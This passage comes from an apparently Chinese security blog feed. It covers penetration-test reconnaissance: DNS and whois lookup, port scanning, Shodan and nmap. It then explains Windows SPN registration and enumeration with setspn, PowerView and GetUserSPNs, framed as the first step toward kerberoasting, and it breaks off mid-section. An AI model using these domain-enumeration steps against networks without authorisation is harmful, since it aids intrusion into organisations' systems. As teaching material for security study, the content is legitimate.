<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>命令：ping nslookup</pre></td></tr><tr><td data-num="2"></td><td><pre>工具：站长之家 ip138</pre></td></tr></table></figure><h4 id="六-端口扫描"><a class="anchor" href="#六-端口扫描">#</a> 六、端口扫描</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap</pre></td></tr><tr><td data-num="2"></td><td><pre>御剑端口扫描</pre></td></tr><tr><td data-num="3"></td><td><pre>shell、python脚本</pre></td></tr></table></figure><h4 id="七-whois查询"><a class="anchor" href="#七-whois查询">#</a> 七、whois 查询</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>站长工具</pre></td></tr><tr><td data-num="2"></td><td><pre>ip138</pre></td></tr><tr><td data-num="3"></td><td><pre>中国万网</pre></td></tr><tr><td data-num="4"></td><td><pre>爱站网</pre></td></tr></table></figure><h4 id="八-子域名查询"><a class="anchor" href="#八-子域名查询">#</a> 八、子域名查询</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">查询方式：枚举</span><span class="token punctuation">(</span>暴力破解<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>工具：子域名挖掘机</pre></td></tr></table></figure><h4 id="九-空间搜索引擎"><a class="anchor" href="#九-空间搜索引擎">#</a> 九、空间搜索引擎</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>shadon</pre></td></tr><tr><td data-num="2"></td><td><pre>钟馗之眼</pre></td></tr><tr><td data-num="3"></td><td><pre>fofa</pre></td></tr></table></figure><h4 id="十-常见端口"><a class="anchor" href="#十-常见端口">#</a> 十、常见端口</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">21</span>：文件传输  <span class="token constant">FTP</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">22</span>：<span class="token constant">SSH</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">23</span>：Telnet</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">25</span>：电子邮件</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">53</span>：<span class="token constant">DNS</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">67</span>：<span class="token constant">DHCP</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">110</span>：<span class="token constant">POP3</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">135</span>：<span class="token constant">RPC</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">139</span>：NetBIOS</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">443</span>：<span class="token constant">HTTPS</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">445</span>：<span class="token constant">SMB</span>协议</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">3306</span>：MySQL</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">3389</span>：远程桌面</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">1521</span>：Orale</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">1433</span>：sql server</pre></td></tr></table></figure><h2 id="00x03什么是信息搜集"><a class="anchor" href="#00x03什么是信息搜集">#</a> 00x03 什么是信息搜集</h2>
<p>信息搜集简单来说就是利用一些手段或者工具，搜集目标的信息。比如 IP 信息，端口信息，DNS 信息甚至是目标的组织架构，有些目标虽然看似不起眼，但是对渗透是否成功起到关键作用。</p>
<p><strong>渗透测试上信息搜集分为两类：主动信息搜集和被动信息搜集。</strong></p>
<h4 id="被动信息搜集"><a class="anchor" href="#被动信息搜集">#</a> <strong>被动信息搜集</strong></h4>
<p>被动信息收集：不与目标直接交互，通过公开渠道可获得的可用的信息。</p>
<p>信息收集内容:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">IP</span>地址段 、域名信息 、邮件地址 、文档图片数据 、公司地址 、公司组织架构 、联系电话 <span class="token operator">/</span> 传真号码 、人员姓名 <span class="token operator">/</span> 职务 、目标系统使用的技术架构 、公开的商业信息</pre></td></tr></table></figure><h5 id="常用工具"><a class="anchor" href="#常用工具">#</a> <strong>常用工具</strong></h5>
<h6 id="nslookup"><a class="anchor" href="#nslookup">#</a> <strong>NSLOOKUP</strong></h6>
<p><code>nslookup</code>  命令几乎在所有的 PC 操作系统上都有安装，用于 ** 查询 DNS 的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。** 信息安全人员，可以通过返回的信息进行信息搜集。</p>
<h6 id="dig"><a class="anchor" href="#dig">#</a> <strong>DIG</strong></h6>
<p><code>Dig</code>  也是对 <code>DNS</code>  信息进行搜集的工具， <code>dig</code>  相比 <code>nsllooup</code>  不光功能更丰富，首先通过默认的上连 <code>DNS</code>  服务器去查询对应的 <code>IP</code>  地址，然后再以设置的 <code>dnsserver</code>  为上连 <code>DNS</code>  服务器。</p>
<h6 id="whois"><a class="anchor" href="#whois">#</a> <strong>Whois</strong></h6>
<p><code>whois</code>  就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过 <code>whois</code>  来实现对域名信息的查询。早期的 <code>whois</code>  查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖 <code>whois</code>  协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。 <code>whois</code>  通常使用 <code>TCP</code>  协议 <code>43</code>  端口。每个域名 <code>/IP</code>  的 <code>whois</code>  信息由对应的管理机构保存。</p>
<h6 id="google-hacking"><a class="anchor" href="#google-hacking">#</a> <strong>google hacking</strong></h6>
<p><code>Google Hacking</code>  是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是 <code>mdb</code>  文件下载， <code>CMS</code>  未被锁定 <code>install</code>  页面，网站配置密码， <code>php</code>  远程文件包含漏洞等重要信息</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTkyL2FydGljbGUvZGV0YWlscy84NDAyOTgwOQ==">参考链接</span></p>
<h6 id="shodan"><a class="anchor" href="#shodan">#</a> <strong>SHODAN</strong></h6>
<p><code>Shodan</code>  是一款网络空间搜索引擎，和我们常见的百度谷歌不同，他主要搜索的是存在于互联网中的设备，服务器、摄像头、工控设备、智能家居等，都是他的目标。 <code>Shodan</code>  不仅可以发现这些设备，并且可以识别出其版本，位置，端口，服务等一些信息，并且进行了一些相应分类。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3JlZW5jb2xsYXIvcC8xMzgxMDI1MC5odG1s">参考链接</span></p>
<h6 id="recon-ng"><a class="anchor" href="#recon-ng">#</a> <strong>RECON-NG</strong></h6>
<p><code>Recon-ng</code>  是一个信息搜集的框架，它之于信息搜集完全可以和 <code>exploit</code>  之于 <code>metasploit framework</code> 、社会工程学之于 <code>SET</code> 。</p>
<h4 id="主动信息搜集"><a class="anchor" href="#主动信息搜集">#</a> <strong>主动信息搜集</strong></h4>
<p>主动信息搜集是利用一些工具和手段，与搜集的目标发生一些交互，从而获得目标信息的一种行为。</p>
<p>主动信息搜集的过程中无法避免会留下一些痕迹。</p>
<h5 id="常用方法"><a class="anchor" href="#常用方法">#</a> <strong>常用方法</strong></h5>
<h6 id="抓包"><a class="anchor" href="#抓包">#</a> <strong>抓包</strong></h6>
<p>用 <code>bp</code>  等工具进行抓包，获取相关信息。</p>
<h6 id="netdiscover"><a class="anchor" href="#netdiscover">#</a> <strong>Netdiscover</strong></h6>
<p><code>NetDiscover</code>  通过  <code>ARP</code>  主动和被动分析识别网络主机， 它主要是在无线接口上使用。 <code>NetDiscover</code>  在不使用  <code>DHCP</code>  的无线网络上非常有用。使用  <code>Netdiscover</code>  工具可以在网络上扫描  <code>IP</code>  地址，检查在线主机或搜索为它们发送的  <code>ARP</code>  请求。</p>
<h6 id="nmap"><a class="anchor" href="#nmap">#</a> <strong>NMAP</strong></h6>
<p>*\Nmap\（* 网络映射器）是 <code>Gordon Lyon</code>  最初编写的一种安全扫描器，用于发现计算机网络上的主机和服务，从而创建网络的 “映射”。为了实现其目标， <code>Nmap</code>  将特定数据包发送到目标主机，然后分析响应 <code>.NMAP</code>  强大的网络工具，用于枚举和测试网络。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20xNTg1NzYxMjk3L2FydGljbGUvZGV0YWlscy84MDAxNTcyNg==">参考链接</span></p>
<h6 id="scapy"><a class="anchor" href="#scapy">#</a> <strong>Scapy</strong></h6>
<p><code>Scapy</code>  是一种用于计算机网络的数据包处理工具，由 <code>Philippe Biondi</code>  用 <code>Python</code>  编写。它可以伪造或解码数据包，通过网络发送它们，捕获它们，并匹配请求和响应。它还可以用于处理扫描、跟踪路由、探测、单元测试、攻击和网络发现等任务。</p>
<p><strong>Scapy 和 Scrapy 完全不同，它俩虽然都和 Python 有关，Scapy 是网络或者是黑客工具，Scrapy 是爬虫框架。</strong></p>
<h6 id="hping"><a class="anchor" href="#hping">#</a> <strong>Hping</strong></h6>
<p><code>Hping</code>  是一个命令行下使用的 <code>TCP/IP</code>  数据包组装 / 分析工具，其命令模式很像 <code>Unix</code>  下的 <code>ping</code>  命令，但是它不是只能发送 <code>ICMP</code>  回应请求，它还可以支持 <code>TCP、UDP、ICMP</code>  和 <code>RAW-IP</code>  协议，它有一个路由跟踪模式，能够在两个相互包含的通道之间传送文件。Hping 常被用于检测网络和主机，其功能非常强大，可在多种操作系统下运行，如 <code>Linux，FreeBSD，NetBSD，OpenBSD，Solaris，MacOs X，Windows</code> 。</p>
<h6 id="dmitry"><a class="anchor" href="#dmitry">#</a> <strong>dmitry</strong></h6>
<p><code>DMitry(Deepmagic Information Gathering Tools</code>  深度信息收集工具) 是一个 <code>linux</code>  下用 <code>C</code>  语言写的工具。它能够尽可能的获取指定主机目标的信息。基础功能是获取目标的子域名， <code>Email</code>  地址，运行时间相关信息， <code>tcp</code>  端口， <code>whois</code>  信息等等。</p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>感言？什么感言？？还不赶紧不信息搜集？？？</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/093F2E5DEC34474D2929F2A4097949BA.gif" alt="img" /></p>
<h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5Y2Ftb3JlbGcvYXJ0aWNsZS9kZXRhaWxzLzExODcyNzkwMQ==">内网渗透 ----1、信息收集：Windows 工作组和域</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2QxOTk2YS9hcnRpY2xlL2RldGFpbHMvMTA4NjQwNjc3">信息收集常用的工具</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlqaWFoYW8uYmFpZHUuY29tL3M/aWQ9MTY2ODc4OTM3Mjc0NDk4OTg3MCZhbXA7d2ZyPXNwaWRlciZhbXA7Zm9yPXBj">盘点信息收集！信息收集的工具你听过几种</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（二）之SPN</title>
    <url>/article/ffbd8b0.html</url>
    <content><![CDATA[<p>唔，上篇是自己找的资料写的，这篇按大佬的要求整理一下。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129204706637-262725350.jpg" alt="image" /></p>
<h2 id="spn"><a class="anchor" href="#spn">#</a> SPN</h2>
<h3 id="spn概述"><a class="anchor" href="#spn概述">#</a> SPN 概述</h3>
<p>SPN( <code>ServicePrincipal Names</code> ) 服务主体名称，是服务实例 (比如：HTTP、SMB、MySQL 等服务) 的唯一标识符。</p>
<p><code>Kerberos</code>  认证过程使用 SPN 将服务实例与服务登录账户相关联，如果想使用  <code>Kerberos</code>  协议来认证服务，那么必须正确配置 SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册 SPN。一个用户账户下可以有多个 SPN，但一个 SPN 只能注册到一个账户。在内网中，SPN 扫描通过查询向域控服务器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端，交换机等。SPN 的识别是 <code>kerberoasting</code>  攻击的第一步。</p>
<p>下面通过一个例子来说明 SPN 的作用：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询<span class="token constant">SPN</span>为MySQL的记录。</pre></td></tr><tr><td data-num="2"></td><td><pre>当找到该<span class="token constant">SPN</span>记录后，用户会再次与<span class="token constant">KDC</span>通信，将<span class="token constant">KDC</span>发放的<span class="token constant">TGT</span>作为身份凭据发送给<span class="token constant">KDC</span>，并将需要访问的<span class="token constant">SPN</span>发送给<span class="token constant">KDC</span>。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token constant">KDC</span>中的<span class="token constant">TGS</span>服务对<span class="token constant">TGT</span>进行解密。确认无误后，由<span class="token constant">TGS</span>将一张允许访问该<span class="token constant">SPN</span>所对应的服务的<span class="token constant">ST</span>服务票据和该<span class="token constant">SPN</span>所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。</pre></td></tr></table></figure><h4 id="spn的两种类型"><a class="anchor" href="#spn的两种类型">#</a> SPN 的两种类型：</h4>
<p>一种是注册在活动目录的机器帐户 ( <code>Computers</code> ) 下，当一个服务的权限为  <code>Local System</code>  或  <code>Network Service</code> ，则 SPN 注册在机器帐户 ( <code>Computers</code> ) 下。</p>
<p>另一种是注册在活动目录的域用户帐户 ( <code>Users</code> ) 下，当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户 ( <code>Users</code> ) 下。</p>
<h4 id="sqlserver服务注册"><a class="anchor" href="#sqlserver服务注册">#</a> SQLServer 服务注册：</h4>
<p><code>SQLServer</code>  在每次启动的时候，都会去尝试用自己的启动账号注册 <code>SPN</code> 。但是在 <code>Windows</code>  域里，默认普通机器账号有权注册 SPN，但是普通域用户账号是没有权注册 SPN 的。这就会导致这样一个现象， <code>SQL Server</code>  如果使用 “ <code>Local System account</code> ” 来启动， <code>Kerberos</code>  就能够成功，因为 <code>SQL Server</code>  这时可以在 <code>DC</code>  上注册 <code>SPN</code> 。如果用一个域用户来启动， <code>Kerberos</code>  就不能成功，因为这时 <code>SPN</code>  注册不上去。</p>
<p><strong>解决办法：</strong></p>
<ul>
<li>可以使用工具 SetSPN -S 来手动注册 SPN。但是这不是一个最好的方法，毕竟手工注册不是长久之计。如果 SPN 下次丢了，又要再次手动注册。</li>
<li>所以比较好的方法，是让 <code>SQL Server</code>  当前启动域账号有注册 <code>SPN</code>  的权力。要在 DC 上为域账号赋予 “ <code>Read servicePrincipalName</code> ” 和 “ <code>Write serverPrincipalName</code> ” 的权限即可。</li>
</ul>
<h3 id="spn的配置"><a class="anchor" href="#spn的配置">#</a> SPN 的配置</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy1zZXJ2ZXIvbmV0d29ya2luZy9zZG4vc2VjdXJpdHkva2VyYmVyb3Mtd2l0aC1zcG4=">微软官方文档</span></p>
<p>在  <code>SPN</code>  的语法中存在四种元素，两个必须元素和两个额外元素，其中 和 为必须元素：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">SPN</span>格式：<span class="token operator">&lt;</span>service <span class="token keyword">class</span><span class="token operator">></span><span class="token operator">/</span><span class="token operator">&lt;</span>host<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>port<span class="token operator">></span><span class="token operator">/</span><span class="token operator">&lt;</span>service name<span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>service <span class="token keyword">class</span><span class="token operator">></span>：标识服务类的字符串，可以理解为服务的名称，常见的有<span class="token constant">WWW</span>、MySQL、<span class="token constant">SMTP</span>、<span class="token constant">MSSQL</span>等；必须元素</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span>host<span class="token operator">></span>：服务所在主机名，host有两种形式，<span class="token constant">FQDN</span><span class="token punctuation">(</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token punctuation">)</span><span class="token function">和NetBIOS</span><span class="token punctuation">(</span>win7<span class="token punctuation">)</span>名；必须元素</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>port<span class="token operator">></span>：服务端口<span class="token punctuation">,</span>如果服务运行在默认端口上<span class="token punctuation">,</span><span class="token function">则端口号</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>可以省略；额外元素</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span>service name<span class="token operator">></span>：服务名称<span class="token punctuation">,</span>可以省略；额外元素</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>一些服务的<span class="token constant">SPN</span>示例：</pre></td></tr><tr><td data-num="9"></td><td><pre>#Exchange服务</pre></td></tr><tr><td data-num="10"></td><td><pre>exchangeMDB<span class="token operator">/</span>ex01<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="11"></td><td><pre>#<span class="token constant">RDP</span>服务</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token constant">TERMSERV</span><span class="token operator">/</span>te01<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="13"></td><td><pre>#WSMan<span class="token operator">/</span>WinRM<span class="token operator">/</span>PSRemoting服务</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token constant">WSMAN</span><span class="token operator">/</span>ws01<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com</pre></td></tr></table></figure><h3 id="使用setspn注册spn"><a class="anchor" href="#使用setspn注册spn">#</a> 使用 SetSPN 注册 SPN</h3>
<p><code>SetSPN</code>  是一个本地 <code>Windows</code>  二进制文件，可用于检索用户帐户和服务之间的映射。该实用程序可以添加，删除或查看 <code>SPN</code>  注册。</p>
<p>环境描述：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>主机：win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>域控：win2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>当前用户：21r000<span class="token operator">/</span>test</pre></td></tr></table></figure><p>查看 SPN 是否已注册：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">L</span> sccmdb</pre></td></tr></table></figure><p>查询是否有重复的 <code>SPN</code>  存在：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">X</span></pre></td></tr></table></figure><p>在运行 <code>sql server</code>  的计算机上注册， <code>setspn.exe</code>  工具包含在 <code>windows server2003 sp1 support tools</code>  中<br />
使用域管理员登陆后，手动注册默认实例：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">A</span> MSSQLSvc<span class="token operator">/</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span> 21r000\win7</pre></td></tr></table></figure><p><strong>注：使用 “-S” 参数而不是用 “-A” 的话则会先验证其要注册的 SPN 是否已存在，如果已存在则提示，并终止操作。</strong></p>
<p><strong>注：注册 SPN 需要域管理员权限，普通域成员注册会提示权限不够！</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205143295-59301349.png" alt="image" /></p>
<p><strong>以 test 用户的身份进行 SPN 服务的注册</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">S</span> SQLServer<span class="token operator">/</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span> 21r000    #21r000必须是当前的用户或setspn <span class="token operator">-</span><span class="token constant">U</span> <span class="token operator">-</span><span class="token constant">A</span> SQLServer<span class="token operator">/</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span> 21r000    #21r000必须是当前的用户</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205210922-220277038.png" alt="image" /></p>
<p><strong>以 WIN7 主机的身份在 DC (<span class="exturl" data-url="aHR0cDovL3dpbjIwMTIuMjFyMDAwLm9yZw==">win2012.21r000.org</span>) 上进行 SPN 服务 (SQLServer) 的注册</strong></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token class-name">S</span> <span class="token class-name">SQLServer</span><span class="token operator">/</span>win7<span class="token punctuation">.</span><span class="token number">21</span>r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1533</span><span class="token operator">/</span>MSSQL <span class="token number">21</span>r000    #<span class="token number">21</span>r000必须是当前的主机名</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205230352-1729074092.png" alt="image" /></p>
<p>如果提示重复，我们可以将端口修改为其他端口，就不是重复的 SPN 了。</p>
<h3 id="spn的发现"><a class="anchor" href="#spn的发现">#</a> SPN 的发现</h3>
<p>由于每台服务器都需要注册用于 <code>Kerberos</code>  身份验证服务的 SPN，因此这为在不进行大规模端口扫描的情况下收集有关内网域环境的信息提供了一个更加隐蔽的方法。</p>
<h4 id="使用setspn查询"><a class="anchor" href="#使用setspn查询">#</a> 使用 SetSPN 查询：</h4>
<p>windows 系统自带的 setspn 可以查询域内的 SPN。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>查看当前域内所有的<span class="token constant">SPN</span>：setspn  <span class="token operator">-</span><span class="token constant">Q</span>  <span class="token operator">*</span><span class="token comment">/*</pre></td></tr><tr><td data-num="2"></td><td><pre>查看指定域 xie.com 注册的 SPN：setspn -T xie.com -Q */</span><span class="token operator">*</span>      如果指定域不存在，则默认切换到查找本域的<span class="token constant">SPN</span></pre></td></tr><tr><td data-num="3"></td><td><pre>查找本域内重复的<span class="token constant">SPN</span>：setspn <span class="token operator">-</span><span class="token constant">X</span></pre></td></tr><tr><td data-num="4"></td><td><pre>删除指定<span class="token constant">SPN</span>：setspn <span class="token operator">-</span><span class="token constant">D</span> MySQL<span class="token operator">/</span>win7<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span><span class="token operator">/</span><span class="token constant">MSSQL</span> hack</pre></td></tr><tr><td data-num="5"></td><td><pre>查找指定用户<span class="token operator">/</span>主机名注册的<span class="token constant">SPN</span>：setspn <span class="token operator">-</span><span class="token constant">L</span> username<span class="token operator">/</span>hostname</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205300777-2009351931.png" alt="image" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205306541-1204845771.png" alt="image" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205312941-1698181958.png" alt="image" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205319493-2125462080.png" alt="image" /></p>
<h4 id="powershell-ad-recon"><a class="anchor" href="#powershell-ad-recon">#</a> PowerShell-AD-Recon：</h4>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhY2ttaXNzL1Bvd2VyU2hlbGwtQUQtUmVjb24=">项目地址</span></p>
<p>该工具包提供了一些探测指定 SPN 的脚本，例如 <code>Exchange，Microsoft SQLServer，Terminal</code>  等</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205352829-526913716.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#Discover<span class="token operator">-</span>PSMSSQLServers<span class="token punctuation">.</span>ps1的使用<span class="token punctuation">,</span>扫描<span class="token constant">MSSQL</span>服务</pre></td></tr><tr><td data-num="2"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSMSSQLServers<span class="token punctuation">.</span>ps1<span class="token punctuation">;</span>Discover<span class="token operator">-</span>PSMSSQLServers</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>#Discover<span class="token operator">-</span>PSMSExchangeServers<span class="token punctuation">.</span>ps1的使用，扫描Exchange服务</pre></td></tr><tr><td data-num="5"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSMSExchangeServers<span class="token punctuation">.</span>ps1<span class="token punctuation">;</span>Discover<span class="token operator">-</span>PSMSExchangeServers</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>#扫描域中所有的<span class="token constant">SPN</span>信息</pre></td></tr><tr><td data-num="8"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSInterestingServices<span class="token punctuation">.</span>ps1<span class="token punctuation">;</span>Discover<span class="token operator">-</span>PSInterestingServices</pre></td></tr></table></figure><p>下面由于靶机文件传输问题盗用一下佬的图，勿怪。</p>
<h4 id="getuserspnsps1"><a class="anchor" href="#getuserspnsps1">#</a> GetUserSPNs.ps1：</h4>
<p><code>GetUserSPNs</code>  是  <code>Kerberoast</code>  工具集中的一个  <code>powershell</code>  脚本，用来查询域内用户注册的 SPN。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pZGVtL2tlcmJlcm9hc3QvYmxvYi9tYXN0ZXIvR2V0VXNlclNQTnMucHMx">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\GetUserSPNs<span class="token punctuation">.</span>ps1</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205434570-842090250.png" alt="image" /></p>
<h4 id="getuserspnsvbs"><a class="anchor" href="#getuserspnsvbs">#</a> GetUserSPNs.vbs：</h4>
<p><code>GetUserSPNs</code>  是  <code>Kerberoast</code>  工具集中的一个  <code>vbs</code>  脚本，用来查询域内用户注册的  <code>SPN</code> 。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pZGVtL2tlcmJlcm9hc3QvYmxvYi9tYXN0ZXIvR2V0VXNlclNQTnMudmJz">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>cscript <span class="token punctuation">.</span>\GetUserSPNs<span class="token punctuation">.</span>vbs</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205512869-1347225001.png" alt="image" /></p>
<h4 id="powerviewps1"><a class="anchor" href="#powerviewps1">#</a> PowerView.ps1：</h4>
<p><code>PowerView</code>  是  <code>PowerSpolit</code>  中  <code>Recon</code>  目录下的一个 <code>powershell</code>  脚本， <code>PowerView</code>  相对于上面几种是根据不同用户的  <code>objectsid</code>  来返回，返回的信息更加详细。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL2Rldi9SZWNvbi9Qb3dlclZpZXcucHMx">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1</pre></td></tr><tr><td data-num="2"></td><td><pre>Get<span class="token operator">-</span>NetUser <span class="token operator">-</span><span class="token constant">SPN</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205604983-1651773650.png" alt="image" /></p>
<h4 id="powershellery"><a class="anchor" href="#powershellery">#</a> PowerShellery：</h4>
